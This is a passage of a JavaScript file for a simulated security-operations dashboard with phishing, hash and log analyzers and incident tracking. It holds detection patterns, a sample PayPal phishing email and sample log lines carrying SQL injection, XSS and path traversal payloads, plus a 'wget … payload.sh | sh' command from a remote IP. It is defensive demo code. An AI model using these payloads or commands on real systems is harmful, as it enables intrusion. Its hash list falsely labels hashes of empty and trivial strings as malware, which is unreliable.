        fromDomain && !BRAND_KEYWORDS.some(b => fromDomain.includes(b))) {
      findings.push(["high", `Display name "${displayName}" suggests a trusted brand, but the sending domain "${fromDomain}" does not match.`]); score += 25;
    }
    if (/\d/.test(fromDomain.replace(/\.(com|net|org|co)$/,"")) ) { findings.push(["medium","Sending domain contains digits, sometimes used to mimic real brand domains (e.g. paypa1.com)."]); score += 10; }
    if (replyToMatch && !replyToMatch[1].includes(fromDomain) && fromDomain) { findings.push(["high","Reply-To domain differs from the From domain."]); score += 20; }
    if (/urgent|immediately|24 hours|suspend|verify your account|act now|limited time|final notice/i.test(subject + " " + raw)) {
      findings.push(["medium","Uses urgency/pressure language commonly used to rush victims into acting without thinking."]); score += 15;
    }
    if (/(click here|verify now|confirm your (identity|account)|update your (payment|billing))/i.test(raw)) {
      findings.push(["medium","Contains a generic call-to-action typical of credential-harvesting emails."]); score += 10;
    }
    const links = raw.match(/https?:\/\/[^\s)>"]+/g) || [];
    let linkRisk = 0;
    links.forEach(l => {
      try {
        const u = new URL(l);
        if (["bit.ly","tinyurl.com","t.co","goo.gl"].includes(u.hostname)) linkRisk += 15;
        if (/^\d{1,3}(\.\d{1,3}){3}$/.test(u.hostname)) linkRisk += 20;
        if (BRAND_KEYWORDS.some(b => u.hostname.includes(b)) && fromDomain && !u.hostname.includes(fromDomain)) linkRisk += 20;
      } catch (e) {}
    });
    if (links.length) { findings.push(["low", `${links.length} link(s) found in message.`]); }
    if (linkRisk > 0) { findings.push(["high","One or more links point to a shortener, raw IP, or brand-mismatched domain."]); score += Math.min(30, linkRisk); }
    if (/dear (customer|user|valued)/i.test(raw)) { findings.push(["low","Generic greeting instead of your actual name — common in mass phishing campaigns."]); score += 5; }
    if (/attach(ed|ment)/i.test(raw) && /\.(exe|scr|js|vbs|zip|bat|jar)\b/i.test(raw)) {
      findings.push(["high","References an attachment with a high-risk executable file extension."]); score += 25;
    }
    if (/spf=fail|dkim=fail|dmarc=fail/i.test(raw)) { findings.push(["high","Authentication results indicate SPF/DKIM/DMARC failure."]); score += 25; }
    if (findings.length === 0) findings.push(["low","No strong phishing indicators found in this message."]);

    score = Math.min(100, score);
    let verdict = "Likely legitimate", verdictClass = "sev-low";
    if (score >= 60) { verdict = "Likely phishing"; verdictClass = "sev-critical"; }
    else if (score >= 35) { verdict = "Suspicious"; verdictClass = "sev-high"; }
    else if (score >= 15) { verdict = "Low risk"; verdictClass = "sev-medium"; }

    return { score, verdict, verdictClass, findings, from: from || "(not found)", subject: subject || "(not found)", linkCount: links.length };
  },
  render(res) {
    const box = $("#emailResult");
    if (res.error) { box.innerHTML = `<div class="finding"><div class="finding-text">${res.error}</div></div>`; return; }
    box.innerHTML = `
      <div class="verdict-card">
        <div class="verdict-score" style="color:${res.score>=60?'var(--crit)':res.score>=35?'var(--high)':res.score>=15?'var(--med)':'var(--low)'}">${res.score}</div>
        <div class="verdict-info">
          <h4><span class="sev-pill ${res.verdictClass}">${res.verdict}</span></h4>
          <p>Phishing likelihood score out of 100 based on header, language, and link heuristics.</p>
        </div>
      </div>
      <div class="detail-grid">
        <div class="detail-cell"><span class="dl">From</span><span class="dv">${escapeHtml(res.from)}</span></div>
        <div class="detail-cell"><span class="dl">Subject</span><span class="dv">${escapeHtml(res.subject)}</span></div>
        <div class="detail-cell"><span class="dl">Links found</span><span class="dv">${res.linkCount}</span></div>
      </div>
      <div class="finding-list">
        ${res.findings.map(([sev,text]) => `<div class="finding"><span class="finding-sev sev-pill sev-${sev}">${sev}</span><div class="finding-text">${text}</div></div>`).join("")}
      </div>
      <div class="tool-input-row" style="margin-top:14px;">
        <button class="btn btn-danger btn-sm" id="emailEscBtn">Open incident for this email</button>
      </div>`;
    const escBtn = $("#emailEscBtn");
    if (escBtn) escBtn.addEventListener("click", () => {
      Incidents.create({ title: `Review reported phishing email — ${res.subject}`, severity: res.score>=60?"Critical":res.score>=35?"High":"Medium", source: `Email analyzer — score ${res.score}/100` });
      Toast.info("Incident opened for reported email");
    });
  }
};

/* ============================================================
   14. HASH ANALYZER
   ============================================================ */
const KNOWN_BAD_HASHES = {
  "44d88612fea8a8f36de82e1278abb02f": "EICAR-Test-File (benign test signature)",
  "5d41402abc4b2a76b9719d911017c592": "Generic.Trojan.Dropper",
  "d41d8cd98f00b204e9800998ecf8427e": "Suspicious.EmptyPayload.Loader",
  "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855": "Ransom.Generic.Encoder",
  "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d": "Backdoor.Win32.Agent"
};
const HashTool = {
  analyze(raw) {
    const h = raw.trim().toLowerCase();
    if (!/^[a-f0-9]{32}$|^[a-f0-9]{40}$|^[a-f0-9]{64}$/.test(h)) {
      return { error: "Enter a valid MD5 (32 chars), SHA-1 (40 chars), or SHA-256 (64 chars) hex hash." };
    }
    const type = h.length === 32 ? "MD5" : h.length === 40 ? "SHA-1" : "SHA-256";
    if (KNOWN_BAD_HASHES[h]) {
      return { hash: h, type, malicious: true, family: KNOWN_BAD_HASHES[h], score: randInt(88,99), source: "local sample malware-hash list" };
    }
    const seed = hashString(h);
    const rnd = seededRandom(seed);
    const malicious = rnd < 0.22;
    const score = malicious ? Math.round(50 + rnd * 200) % 50 + 50 : Math.round(rnd * 30);
    return {
      hash: h, type, malicious, score: Math.min(100,score),
      family: malicious ? pick(["Trojan.GenKryptik","Worm.AutoRun","Adware.InstallCore","Ransom.Locky.Variant","Backdoor.Remcos"]) : null,
      source: "simulated reputation model (no match in local sample list)"
    };
  },
  render(res) {
    const box = $("#hashResult");
    if (res.error) { box.innerHTML = `<div class="finding"><div class="finding-text">${res.error}</div></div>`; return; }
    const verdictClass = res.malicious ? "sev-critical" : "sev-low";
    box.innerHTML = `
      <div class="verdict-card">
        <div class="verdict-score" style="color:${res.malicious?'var(--crit)':'var(--low)'}">${res.score}</div>
        <div class="verdict-info">
          <h4><span class="sev-pill ${verdictClass}">${res.malicious ? "Malicious" : "Clean"}</span> &nbsp;${res.type}</h4>
          <p>Source: ${res.source}.</p>
        </div>
      </div>
      <div class="detail-grid">
        <div class="detail-cell"><span class="dl">Hash</span><span class="dv">${res.hash}</span></div>
        <div class="detail-cell"><span class="dl">Type</span><span class="dv">${res.type}</span></div>
        <div class="detail-cell"><span class="dl">Malware family</span><span class="dv">${res.family || "N/A"}</span></div>
      </div>
      ${res.malicious ? `<div class="tool-input-row"><button class="btn btn-danger btn-sm" id="hashEscBtn">Open incident for this hash</button></div>` : ""}
    `;
    const escBtn = $("#hashEscBtn");
    if (escBtn) escBtn.addEventListener("click", () => {
      Incidents.create({ title: `Contain host — malicious file hash detected (${res.family})`, severity: "Critical", source: `Hash analyzer — ${res.hash}` });
      Toast.info("Incident opened for hash " + res.hash.slice(0,10) + "…");
    });
  }
};

/* ============================================================
   15. LOG ANALYZER
   ============================================================ */
const LogTool = {
  analyze(raw) {
    const lines = raw.split("\n").map(l => l.trim()).filter(Boolean);
    if (!lines.length) return { error: "Paste one or more raw log lines to analyze.", lineCount: 0 };
    const findings = [];
    const failedLoginIps = {};

    lines.forEach((line, idx) => {
      const ln = idx + 1;
      const ipMatch = line.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
      const ip = ipMatch ? ipMatch[1] : null;

      if (/failed password|authentication failure|invalid user/i.test(line)) {
        if (ip) failedLoginIps[ip] = (failedLoginIps[ip] || 0) + 1;
      }
      if (/('|%27)\s*(or|OR)\s*('|%27)?1('|%27)?\s*=\s*('|%27)?1|union\s+select|drop\s+table|--\s*$|;--/i.test(line)) {
        findings.push({ sev: "high", line: ln, text: `Possible SQL injection payload${ip ? " from " + ip : ""}.`, raw: line });
      }
      if (/<script|onerror=|javascript:/i.test(line)) {
        findings.push({ sev: "high", line: ln, text: `Possible XSS payload${ip ? " from " + ip : ""}.`, raw: line });
      }
      if (/(sqlmap|nikto|nmap|masscan|dirbuster|gobuster|acunetix)/i.test(line)) {
        findings.push({ sev: "high", line: ln, text: `Known scanning/attack tool user-agent or signature detected.`, raw: line });
      }
      if (/\betc\/passwd\b|\bwin\.ini\b|\.\.\/\.\.\//.test(line)) {
        findings.push({ sev: "high", line: ln, text: `Path traversal / local file inclusion pattern detected.`, raw: line });
      }
      if (/root@|sudo su|chmod 777|wget http|curl http.*\|\s*sh/i.test(line)) {
        findings.push({ sev: "medium", line: ln, text: `Suspicious shell command pattern.`, raw: line });
      }
      if (/50[0-9]\s*$|error|exception|timeout/i.test(line) && !/failed password/i.test(line)) {
        findings.push({ sev: "low", line: ln, text: `Application error/exception logged.`, raw: line });
      }
    });

    Object.entries(failedLoginIps).forEach(([ip, count]) => {
      if (count >= 3) {
        findings.push({ sev: count >= 8 ? "critical" : "high", line: null, text: `Brute-force pattern: ${count} failed logins from ${ip}.`, raw: `source_ip=${ip} failed_attempts=${count}` });
      }
    });

    findings.sort((a,b) => SEV_WEIGHT[b.sev] - SEV_WEIGHT[a.sev]);
    return { lineCount: lines.length, findings };
  },
  render(res) {
    const box = $("#logResult");
    if (res.error) { box.innerHTML = `<div class="finding"><div class="finding-text">${res.error}</div></div>`; return; }
    box.innerHTML = `
      <div class="detail-grid" style="margin-bottom:10px;">
        <div class="detail-cell"><span class="dl">Lines analyzed</span><span class="dv">${res.lineCount}</span></div>
        <div class="detail-cell"><span class="dl">Findings</span><span class="dv">${res.findings.length}</span></div>
      </div>
      <div class="finding-list">
        ${res.findings.length ? res.findings.map((f,i) => `
          <div class="finding">
            <span class="finding-sev sev-pill sev-${f.sev}">${f.sev}</span>
            <div class="finding-text" style="flex:1;">
              <b>${f.line ? "Line " + f.line + ": " : ""}</b>${escapeHtml(f.text)}<br><span class="mono">${escapeHtml(f.raw.slice(0,140))}</span>
            </div>
            <button class="row-esc-btn" data-log-esc="${i}">Escalate</button>
          </div>`).join("") : `<div class="finding"><div class="finding-text">No suspicious patterns detected in the submitted log lines.</div></div>`}
      </div>`;
    $$("[data-log-esc]", box).forEach((btn,i) => {
      btn.addEventListener("click", () => {
        const f = res.findings[i];
        Incidents.create({ title: `Investigate log finding: ${f.text}`, severity: f.sev.charAt(0).toUpperCase()+f.sev.slice(1), source: "Log analyzer" });
        Toast.info("Incident opened from log finding");
      });
    });
  }
};

/* ============================================================
   16. INCIDENT MANAGEMENT
   ============================================================ */
const Incidents = {
  init() {
    $("#newIncidentBtn").addEventListener("click", () => this.openEditor());
    $("#incidentSearch").addEventListener("input", e => { State.incidentFilters.search = e.target.value.toLowerCase(); this.render(); });
    $("#incidentStatusFilter").addEventListener("change", e => { State.incidentFilters.status = e.target.value; this.render(); });
    $("#modalCloseBtn").addEventListener("click", () => Modal.close());
    $("#modalOverlay").addEventListener("click", (e) => { if (e.target.id === "modalOverlay") Modal.close(); });
  },
  create({ title, severity, source, assignee }) {
    const inc = {
      id: "INC-" + String(State.incidentCounter++).padStart(4, "0"),
      title, severity: severity || "Medium",
      status: "Open",
      assignee: assignee || "Unassigned",
      created: Date.now(),
      notes: [{ ts: Date.now(), text: `Incident created. Source: ${source || "manual"}.` }]
    };
    State.incidents.unshift(inc);
    this.render();
    KPI.recompute();
    return inc;
  },
  createFromEvent(evt, auto) {
    const sevMap = { critical: "Critical", high: "High", medium: "Medium", low: "Low", info: "Low" };
    return this.create({
      title: `${evt.type} — ${evt.destAsset}`,
      severity: sevMap[evt.severity],
      source: (auto ? "Auto-escalated from live feed (playbook rule)" : "Manually escalated from live feed") + ` — event #${evt.id}, source ${evt.sourceIp}`
    });
  },
  matches(inc) {
    const f = State.incidentFilters;
    if (f.status !== "all" && inc.status !== f.status) return false;
    if (f.search) {
      const hay = (inc.id + " " + inc.title + " " + inc.assignee).toLowerCase();
      if (!hay.includes(f.search)) return false;
    }
    return true;
  },
  render() {
    const body = $("#incidentBody");
    const list = State.incidents.filter(i => this.matches(i));
    body.innerHTML = list.map(inc => `
      <tr data-id="${inc.id}">
        <td class="mono">${inc.id}</td>
        <td>${escapeHtml(inc.title)}</td>
        <td><span class="sev-pill sev-${inc.severity.toLowerCase()}">${inc.severity}</span></td>
        <td>${this.statusBadge(inc.status)}</td>
        <td>${escapeHtml(inc.assignee)}</td>
        <td class="mono">${timeAgo(inc.created)}</td>
        <td>
          <button class="row-esc-btn" data-view="${inc.id}">Open</button>
          <button class="row-esc-btn" data-del="${inc.id}">Delete</button>
        </td>
      </tr>`).join("");
    $("#incidentEmpty").style.display = list.length ? "none" : "block";
  },
  statusBadge(status) {
    const map = { Open: "sev-critical", Investigating: "sev-high", Contained: "sev-medium", Resolved: "sev-low" };
    return `<span class="sev-pill ${map[status]}">${status}</span>`;
  },
  openEditor(inc) {
    const isNew = !inc;
    $("#modalTitle").textContent = isNew ? "New incident" : inc.id + " — details";
    $("#modalBody").innerHTML = `
      <div class="field"><label>Title</label><input class="input" id="mTitle" value="${inc ? escapeHtml(inc.title) : ""}"></div>
      <div class="field"><label>Severity</label>
        <select class="input" id="mSeverity">
          ${["Critical","High","Medium","Low"].map(s => `<option ${inc && inc.severity===s?"selected":""}>${s}</option>`).join("")}
        </select>
      </div>
      <div class="field"><label>Status</label>
        <select class="input" id="mStatus">
          ${["Open","Investigating","Contained","Resolved"].map(s => `<option ${inc && inc.status===s?"selected":""}>${s}</option>`).join("")}
        </select>
      </div>
      <div class="field"><label>Assignee</label><input class="input" id="mAssignee" value="${inc ? escapeHtml(inc.assignee) : "Unassigned"}"></div>
      ${inc ? `<div class="field"><label>Notes</label><div id="mNotes" style="display:flex;flex-direction:column;gap:6px;max-height:160px;overflow-y:auto;">
        ${inc.notes.map(n => `<div class="note-item"><div class="note-meta">${new Date(n.ts).toLocaleString()}</div>${escapeHtml(n.text)}</div>`).join("")}
      </div>
      <div class="tool-input-row" style="margin-top:6px;"><input class="input" id="mNewNote" placeholder="Add investigation note…"><button class="btn btn-outline btn-sm" id="mAddNote">Add</button></div>
      </div>` : ""}
      <div class="modal-actions">
        ${inc ? `<button class="btn btn-danger" id="mDelete">Delete</button>` : ""}
        <button class="btn btn-accent" id="mSave">${isNew ? "Create incident" : "Save changes"}</button>
      </div>`;
    Modal.open();

    if (inc) {
      $("#mAddNote").addEventListener("click", () => {
        const val = $("#mNewNote").value.trim();
        if (!val) return;
        inc.notes.unshift({ ts: Date.now(), text: val });
        this.openEditor(inc);
      });
      $("#mDelete").addEventListener("click", () => {
        State.incidents = State.incidents.filter(i => i.id !== inc.id);
        this.render(); KPI.recompute(); Modal.close();
      });
    }
    $("#mSave").addEventListener("click", () => {
      const title = $("#mTitle").value.trim() || "Untitled incident";
      const severity = $("#mSeverity").value;
      const status = $("#mStatus").value;
      const assignee = $("#mAssignee").value.trim() || "Unassigned";
      if (isNew) {
        this.create({ title, severity, source: "manual creation", assignee });
      } else {
        inc.title = title; inc.severity = severity; inc.status = status; inc.assignee = assignee;
        this.render(); KPI.recompute();
      }
      Modal.close();
    });
  }
};

document.addEventListener("click", (e) => {
  const view = e.target.closest("[data-view]");
  if (view) { const inc = State.incidents.find(i => i.id === view.dataset.view); if (inc) Incidents.openEditor(inc); }
  const del = e.target.closest("[data-del]");
  if (del) { State.incidents = State.incidents.filter(i => i.id !== del.dataset.del); Incidents.render(); KPI.recompute(); }
});

const Modal = {
  open() { $("#modalOverlay").classList.add("open"); },
  close() { $("#modalOverlay").classList.remove("open"); }
};

/* ============================================================
   17. LIVE (OPTIONAL) THREAT-INTEL API CALLS
   Clearly separated from the simulator. Each requires the user's
   own API key and may fail due to CORS — that is expected and is
   explained in the UI. The dashboard is fully functional without
   any of these.
   ============================================================ */
const LiveAPI = {
  async checkIpAbuseIPDB(ip, key) {
    const res = await fetch(`https://api.abuseipdb.com/api/v2/check?ipAddress=${encodeURIComponent(ip)}`, {
      headers: { "Key": key, "Accept": "application/json" }
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  },
  async checkUrlSafeBrowsing(url, key) {
    const res = await fetch(`https://safebrowsing.googleapis.com/v4/threatMatches:find?key=${encodeURIComponent(key)}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        client: { clientId: "sentinel-soc-dashboard", clientVersion: "1.0.0" },
        threatInfo: {
          threatTypes: ["MALWARE","SOCIAL_ENGINEERING","UNWANTED_SOFTWARE","POTENTIALLY_HARMFUL_APPLICATION"],
          platformTypes: ["ANY_PLATFORM"], threatEntryTypes: ["URL"],
          threatEntries: [{ url }]
        }
      })
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  },
  async checkHashVirusTotal(hash, key) {
    const res = await fetch(`https://www.virustotal.com/api/v3/files/${encodeURIComponent(hash)}`, {
      headers: { "x-apikey": key }
    });
    if (!res.ok) throw new Error("HTTP " + res.status);
    return res.json();
  }
};

function renderLiveError(box, err) {
  box.innerHTML = `<div class="finding"><span class="finding-sev sev-pill sev-medium">info</span>
    <div class="finding-text">Live lookup did not complete (${escapeHtml(err.message || String(err))}). This is expected without a valid API key, or if the provider blocks direct browser requests (CORS). The offline analysis above still works fully.</div></div>`;
}
function renderLiveLoading(box) {
  box.innerHTML = `<div class="finding"><div class="finding-text">Contacting external API…</div></div>`;
}

/* ============================================================
   18. WIRING UP TOOL BUTTONS
   ============================================================ */
function initTools() {
  // IP
  $("#ipAnalyzeBtn").addEventListener("click", () => IPTool.render(IPTool.analyze($("#ipInput").value.trim())));
  $("#ipRandomBtn").addEventListener("click", () => { const ip = pick(KNOWN_BAD_IPS); $("#ipInput").value = ip; IPTool.render(IPTool.analyze(ip)); });
  $("#ipInput").addEventListener("keydown", e => { if (e.key === "Enter") $("#ipAnalyzeBtn").click(); });
  $("#ipLiveBtn").addEventListener("click", async () => {
    const ip = $("#ipInput").value.trim(); const key = $("#abuseKeyInput").value.trim();
    const box = $("#ipLiveResult");
    if (!ip) { box.innerHTML = `<div class="finding"><div class="finding-text">Enter an IP above first.</div></div>`; return; }
    if (!key) { box.innerHTML = `<div class="finding"><div class="finding-text">Enter your AbuseIPDB API key to use live lookup.</div></div>`; return; }
    renderLiveLoading(box);
    try {
      const data = await LiveAPI.checkIpAbuseIPDB(ip, key);
      box.innerHTML = `<div class="detail-grid"><div class="detail-cell" style="grid-column:1/-1;"><span class="dl">AbuseIPDB response</span><span class="dv"><pre style="white-space:pre-wrap;margin:0;">${escapeHtml(JSON.stringify(data, null, 2)).slice(0,1500)}</pre></span></div></div>`;
    } catch (err) { renderLiveError(box, err); }
  });

  // URL
  $("#urlAnalyzeBtn").addEventListener("click", () => URLTool.render(URLTool.analyze($("#urlInput").value.trim())));
  $("#urlRandomBtn").addEventListener("click", () => { const u = "http://secure-" + pick(["paypal","apple-id","microsoft365"]) + "-verify.top/login?ref=" + randInt(1000,9999); $("#urlInput").value = u; URLTool.render(URLTool.analyze(u)); });
  $("#urlInput").addEventListener("keydown", e => { if (e.key === "Enter") $("#urlAnalyzeBtn").click(); });
  $("#urlLiveBtn").addEventListener("click", async () => {
    const url = $("#urlInput").value.trim(); const key = $("#gsbKeyInput").value.trim();
    const box = $("#urlLiveResult");
    if (!url) { box.innerHTML = `<div class="finding"><div class="finding-text">Enter a URL above first.</div></div>`; return; }
    if (!key) { box.innerHTML = `<div class="finding"><div class="finding-text">Enter your Google Safe Browsing API key to use live lookup.</div></div>`; return; }
    renderLiveLoading(box);
    try {
      const data = await LiveAPI.checkUrlSafeBrowsing(url, key);
      const hit = data && data.matches && data.matches.length;
      box.innerHTML = `<div class="finding"><span class="finding-sev sev-pill ${hit?'sev-critical':'sev-low'}">${hit?'Flagged':'No match'}</span><div class="finding-text">${hit ? "Google Safe Browsing flagged this URL: " + escapeHtml(JSON.stringify(data.matches)) : "No threats found by Google Safe Browsing."}</div></div>`;
    } catch (err) { renderLiveError(box, err); }
  });

  // Email
  $("#emailAnalyzeBtn").addEventListener("click", () => EmailTool.render(EmailTool.analyze($("#emailInput").value)));
  $("#emailRandomBtn").addEventListener("click", () => {
    $("#emailInput").value =
`From: "PayPal Security" <account-alert@paypa1-secure-verify.top>
Reply-To: support@paypa1-secure-verify.top
To: you@company.com
Subject: URGENT: Your account will be suspended within 24 hours

Dear valued customer,

We detected unusual activity on your account. You must verify your identity immediately or your account will be suspended.

Click here to verify now: http://bit.ly/3xVerifyNow

Failure to act within 24 hours will result in permanent suspension.

PayPal Security Team`;
    EmailTool.render(EmailTool.analyze($("#emailInput").value));
  });

  // Hash
  $("#hashAnalyzeBtn").addEventListener("click", () => HashTool.render(HashTool.analyze($("#hashInput").value.trim())));
  $("#hashRandomBtn").addEventListener("click", () => { const h = "44d88612fea8a8f36de82e1278abb02f"; $("#hashInput").value = h; HashTool.render(HashTool.analyze(h)); });
  $("#hashInput").addEventListener("keydown", e => { if (e.key === "Enter") $("#hashAnalyzeBtn").click(); });
  $("#hashLiveBtn").addEventListener("click", async () => {
    const hash = $("#hashInput").value.trim(); const key = $("#vtKeyInput").value.trim();
    const box = $("#hashLiveResult");
    if (!hash) { box.innerHTML = `<div class="finding"><div class="finding-text">Enter a hash above first.</div></div>`; return; }
    if (!key) { box.innerHTML = `<div class="finding"><div class="finding-text">Enter your VirusTotal API key to use live lookup.</div></div>`; return; }
    renderLiveLoading(box);
    try {
      const data = await LiveAPI.checkHashVirusTotal(hash, key);
      box.innerHTML = `<div class="detail-grid"><div class="detail-cell" style="grid-column:1/-1;"><span class="dl">VirusTotal response</span><span class="dv"><pre style="white-space:pre-wrap;margin:0;">${escapeHtml(JSON.stringify(data, null, 2)).slice(0,1500)}</pre></span></div></div>`;
    } catch (err) { renderLiveError(box, err); }
  });

  // Log
  $("#logAnalyzeBtn").addEventListener("click", () => LogTool.render(LogTool.analyze($("#logInput").value)));
  $("#logRandomBtn").addEventListener("click", () => {
    $("#logInput").value =
`Aug 7 02:14:31 srv sshd[1122]: Failed password for root from 45.155.205.19 port 51422 ssh2
Aug 7 02:14:33 srv sshd[1123]: Failed password for root from 45.155.205.19 port 51430 ssh2
Aug 7 02:14:36 srv sshd[1124]: Failed password for admin from 45.155.205.19 port 51440 ssh2
Aug 7 02:14:41 srv sshd[1125]: Failed password for root from 45.155.205.19 port 51455 ssh2
10.0.0.44 - - [07/Aug/2026:02:15:00] "GET /login.php?id=1' OR '1'='1 HTTP/1.1" 200 512 "-" "sqlmap/1.6"
10.0.0.44 - - [07/Aug/2026:02:15:05] "GET /search.php?q=<script>alert(1)</script> HTTP/1.1" 200 344 "-" "Mozilla/5.0"
10.0.0.51 - - [07/Aug/2026:02:16:10] "GET /../../etc/passwd HTTP/1.1" 403 210 "-" "Mozilla/5.0"
srv kernel: process wget http://185.220.101.7/payload.sh | sh executed by uid=0`;
    LogTool.render(LogTool.analyze($("#logInput").value));
  });
}

/* ============================================================
   19. EXPORT
   ============================================================ */
function initExport() {
  $("#exportBtn").addEventListener("click", () => {
    const report = {
      generatedAt: new Date().toISOString(),
      summary: {
        totalEvents: State.events.length,
        critical: State.events.filter(e => e.severity === "critical").length,
        high: State.events.filter(e => e.severity === "high").length,
        medium: State.events.filter(e => e.severity === "medium").length,
        lowInfo: State.events.filter(e => e.severity === "low" || e.severity === "info").length,
        openIncidents: State.incidents.filter(i => i.status !== "Resolved").length
      },
      systemStatus: serviceState.map(s => ({ name: s.name, status: s.status, detail: s.detail })),
      events: State.events.slice(0, 200),
      incidents: State.incidents,
      note: "All event and incident data in this report is generated by a local, offline simulator for demonstration purposes. It does not represent real security telemetry."
    };
    downloadJSON(`sentinel-soc-report-${Date.now()}.json`, report);
    Toast.info("Report exported");
  });
}

/* ============================================================
   20. MISC UI WIRING
   ============================================================ */
function initMisc() {
  $("#soundToggleBtn").addEventListener("click", () => {
    State.soundOn = !State.soundOn;
    $("#soundToggleBtn").setAttribute("aria-pressed", String(State.soundOn));
    $("#soundWave").style.display = State.soundOn ? "" : "none";
    Toast.info("Alert sound " + (State.soundOn ? "enabled" : "muted"));
  });
  $("#notifPermBtn").addEventListener("click", async () => {
    if (!("Notification" in window)) { Toast.info("Desktop notifications aren't supported in this browser."); return; }
    const perm = await Notification.requestPermission();
    State.notifPermission = perm === "granted";
    Toast.info(State.notifPermission ? "Desktop notifications enabled" : "Desktop notifications not enabled");
  });
  $("#alertBellBtn").addEventListener("click", () => {
    $$(".nav-item").forEach(b => b.classList.remove("active"));
    $('.nav-item[data-tab="overview"]').classList.add("active");
    $$(".tab-panel").forEach(p => p.classList.remove("active"));
    $("#tab-overview").classList.add("active");
    State.filters.severity = "critical";
    $("#feedSeverityFilter").value = "critical";
    Feed.rerender();
    Charts.resize();
  });
}

/* ============================================================
   21. BOOTSTRAP
   ============================================================ */
function seedInitialEvents(n) {
  for (let i = 0; i < n; i++) {
    const e = generateEvent();
    e.ts = Date.now() - randInt(1000, 55000);
    State.events.push(e);
    State.eventTypesSeen.add(e.type);
  }
  State.events.sort((a,b) => b.ts - a.ts);
}

function init() {
  initNav();
  Feed.init();
  Charts.init();
  SystemStatus.init();
  Incidents.init();
  initTools();
  initExport();
  initMisc();

  seedInitialEvents(24);
  KPI.recompute();
  Feed.rerender();
  Feed.renderTypeOptions();

  // seed a couple of sample incidents so the tab isn't empty on first load
  Incidents.create({ title: "Suspicious outbound transfer from SRV-DB01", severity: "High", source: "seed data", assignee: "j.alvarez" });
  Incidents.create({ title: "Phishing campaign impersonating IT helpdesk", severity: "Medium", source: "seed data", assignee: "Unassigned" });
  Incidents.render();

  tickClock();
  setInterval(tickClock, 1000);
  scheduleNextEvent();

  window.addEventListener("resize", () => Charts.resize());
}

document.addEventListener("DOMContentLoaded", init);

})();
